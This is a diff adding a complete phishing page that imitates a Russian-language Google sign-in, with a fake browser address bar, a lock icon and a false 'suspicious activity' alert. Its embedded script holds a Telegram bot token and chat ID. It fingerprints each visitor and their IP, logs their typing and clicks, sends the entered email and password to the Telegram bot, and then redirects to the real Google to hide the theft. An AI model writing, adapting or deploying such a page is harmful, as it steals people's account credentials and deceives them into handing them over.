@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account - Security Check</title>
+    <!-- Google Fonts и иконки -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        
+        /* Фейковый браузер (для ПК) */
+        .fake-browser {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 24px 48px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        
+        /* Адресная строка */
+        .browser-bar {
+            background: #f1f3f4;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #dadce0;
+        }
+        
+        .browser-dots {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .dot.red { background: #ed6a5e; }
+        .dot.yellow { background: #f5bd4f; }
+        .dot.green { background: #61c454; }
+        
+        .url-bar {
+            background: white;
+            padding: 8px 16px;
+            border-radius: 24px;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #dadce0;
+            font-size: 14px;
+            color: #202124;
+        }
+        
+        .url-bar i {
+            color: #5f6368;
+            font-size: 18px;
+        }
+        
+        .url-bar span {
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        
+        /* Контент Google */
+        .google-header {
+            display: flex;
+            align-items: center;
+            padding: 24px 24px 16px;
+            gap: 16px;
+        }
+        
+        .google-icon {
+            width: 48px;
+            height: 48px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: 500;
+        }
+        
+        .google-title h1 {
+            font-size: 24px;
+            color: #202124;
+            font-weight: 500;
+        }
+        
+        .google-title p {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        
+        /* Уведомление безопасности */
+        .security-alert {
+            background: #e8f0fe;
+            margin: 0 24px 24px;
+            padding: 16px;
+            border-radius: 12px;
+            border-left: 4px solid #1a73e8;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .security-alert i {
+            color: #1a73e8;
+            font-size: 24px;
+        }
+        
+        .security-alert p {
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        /* Форма входа */
+        .login-form {
+            padding: 0 24px 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 6px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 24px 0;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #1a73e8;
+        }
+        
+        .checkbox-group label {
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .button:hover {
+            background: #1669d6;
+        }
+        
+        .links {
+            margin-top: 24px;
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Трекер действий (невидимый) */
+        .tracker-pixel {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* Мобильная версия */
+        @media (max-width: 480px) {
+            .fake-browser {
+                border-radius: 0;
+            }
+            
+            .browser-bar {
+                border-radius: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Фейковый браузер -->
+    <div class="fake-browser" id="browserWindow">
+        <!-- Адресная строка -->
+        <div class="browser-bar">
+            <div class="browser-dots">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+            </div>
+            <div class="url-bar">
+                <i class="material-icons">lock</i>
+                <span>https://</span>accounts.google.com/signin/v2/identifier
+                <i class="material-icons" style="margin-left: auto;">star_border</i>
+            </div>
+        </div>
+        
+        <!-- Контент Google -->
+        <div class="google-header">
+            <div class="google-icon">G</div>
+            <div class="google-title">
+                <h1>Вход в аккаунт Google</h1>
+                <p>Продолжите в своей учётной записи</p>
+            </div>
+        </div>
+        
+        <!-- Уведомление безопасности (психологический приём) -->
+        <div class="security-alert">
+            <i class="material-icons">security</i>
+            <p>Обнаружена подозрительная активность. Подтвердите личность для восстановления доступа.</p>
+        </div>
+        
+        <!-- Форма входа -->
+        <div class="login-form">
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>Email или телефон</label>
+                    <input type="text" id="username" placeholder="example@gmail.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Пароль</label>
+                    <input type="password" id="password" placeholder="············" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="staySigned" checked>
+                    <label for="staySigned">Оставаться в системе</label>
+                </div>
+                
+                <button type="submit" class="button">Далее</button>
+            </form>
+            
+            <div class="links">
+                <a href="#">Создать аккаунт</a> • 
+                <a href="#">Нужна помощь?</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Невидимый трекер для сбора данных о жертве -->
+    <div class="tracker-pixel" id="tracker"></div>
+
+    <script>
+    // ===== ТВОИ ДАННЫЕ (уже вставлены) =====
+    const BOT_TOKEN = "8688927439:AAGLGNK2meKkwiq509wnR2up6oq98-R8pcE";
+    const CHAT_ID = "6689561934";
+    
+    // ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => console.log('✅ Отправлено в Telegram'))
+        .catch(error => console.error('❌ Ошибка отправки:', error));
+    }
+    
+    // ===== 1. СБОР ИНФОРМАЦИИ О ЖЕРТВЕ (при загрузке страницы) =====
+    function collectVictimInfo() {
+        const info = [];
+        info.push(`🕵️‍♂️ <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>`);
+        info.push(`🕐 Время: ${new Date().toLocaleString()}`);
+        info.push(`🌐 URL: ${window.location.href}`);
+        info.push(`📱 User-Agent: ${navigator.userAgent}`);
+        info.push(`💻 Платформа: ${navigator.platform}`);
+        info.push(`🌍 Язык: ${navigator.language}`);
+        info.push(`📏 Экран: ${screen.width}x${screen.height}`);
+        info.push(`🎨 Глубина цвета: ${screen.colorDepth}-bit`);
+        info.push(`🕒 Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+        
+        // Пытаемся получить IP через бесплатный сервис (опционально)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                info.push(`🌐 IP-адрес: ${data.ip}`);
+                sendToTelegram(info.join('\n'));
+            })
+            .catch(() => {
+                // Если не получилось, отправляем без IP
+                sendToTelegram(info.join('\n'));
+            });
+    }
+    
+    // ===== 2. ТРЕКЕР ДЕЙСТВИЙ =====
+    function trackAction(action) {
+        console.log(`📊 Действие: ${action}`);
+        // Можно отправлять каждое действие, но лучше собирать и отправлять раз в 30 секунд
+        if (!window.actionQueue) window.actionQueue = [];
+        window.actionQueue.push(`[${new Date().toLocaleTimeString()}] ${action}`);
+    }
+    
+    // Отправка накопленных действий
+    function flushActions() {
+        if (window.actionQueue && window.actionQueue.length > 0) {
+            const actionsText = window.actionQueue.join('\n');
+            sendToTelegram(`📋 <b>ЖУРНАЛ ДЕЙСТВИЙ</b>\n${actionsText}`);
+            window.actionQueue = [];
+        }
+    }
+    
+    // Отправляем раз в 30 секунд
+    setInterval(flushActions, 30000);
+    
+    // ===== 3. ОБРАБОТЧИКИ СОБЫТИЙ (трекинг) =====
+    document.addEventListener('DOMContentLoaded', function() {
+        // Отслеживаем клики по ссылкам
+        document.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                trackAction(`Клик по ссылке: ${this.textContent.trim() || this.href}`);
+            });
+        });
+        
+        // Отслеживаем фокус на полях ввода
+        document.getElementById('username').addEventListener('focus', () => {
+            trackAction('Фокус на поле Email');
+        });
+        
+        document.getElementById('password').addEventListener('focus', () => {
+            trackAction('Фокус на поле Пароль');
+        });
+        
+        // Отслеживаем ввод (с debounce)
+        let usernameTimeout, passwordTimeout;
+        document.getElementById('username').addEventListener('input', function() {
+            clearTimeout(usernameTimeout);
+            usernameTimeout = setTimeout(() => {
+                if (this.value.length > 3) {
+                    trackAction(`Ввод Email: ${this.value.substring(0, 3)}*** (скрыто)`);
+                }
+            }, 2000);
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            clearTimeout(passwordTimeout);
+            passwordTimeout = setTimeout(() => {
+                trackAction(`Ввод пароля: ${'•'.repeat(this.value.length)} (${this.value.length} символов)`);
+            }, 2000);
+        });
+        
+        // Отслеживаем чекбокс
+        document.getElementById('staySigned').addEventListener('change', function() {
+            trackAction(`Чекбокс "Оставаться в системе": ${this.checked ? '✅' : '❌'}`);
+        });
+        
+        // Запускаем сбор информации о жертве
+        collectVictimInfo();
+    });
+    
+    // ===== 4. ОБРАБОТКА ОТПРАВКИ ФОРМЫ =====
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const staySigned = document.getElementById('staySigned').checked;
+        
+        if (!username || !password) {
+            alert('Пожалуйста, заполните все поля');
+            return;
+        }
+        
+        // Формируем сообщение с данными
+        const message = [
+            `🔐 <b>ПЕРЕХВАЧЕНЫ ДАННЫЕ</b>`,
+            `👤 Логин: ${username}`,
+            `🔑 Пароль: ${password}`,
+            `💾 Оставаться в системе: ${staySigned ? 'Да' : 'Нет'}`,
+            `🕐 Время: ${new Date().toLocaleString()}`,
+            `📱 User-Agent: ${navigator.userAgent}`
+        ].join('\n');
+        
+        // Отправляем в Telegram
+        sendToTelegram(message);
+        
+        // Отправляем накопленные действия перед редиректом
+        flushActions();
+        
+        // Перенаправляем на реальный Google (жертва не замечает подвоха)
+        setTimeout(() => {
+            window.location.href = 'https://accounts.google.com';
+        }, 500);
+    });
+    
+    // ===== 5. ЭМУЛЯЦИЯ АДРЕСНОЙ СТРОКИ (для мобильных) =====
+    // Скрываем настоящую адресную строку при скролле
+    window.addEventListener('scroll', function() {
+        if (window.scrollY > 10) {
+            document.querySelector('.browser-bar').style.opacity = '0.95';
+        } else {
+            document.querySelector('.browser-bar').style.opacity = '1';
+        }
+    });
+    </script>
+</body>
+</html>
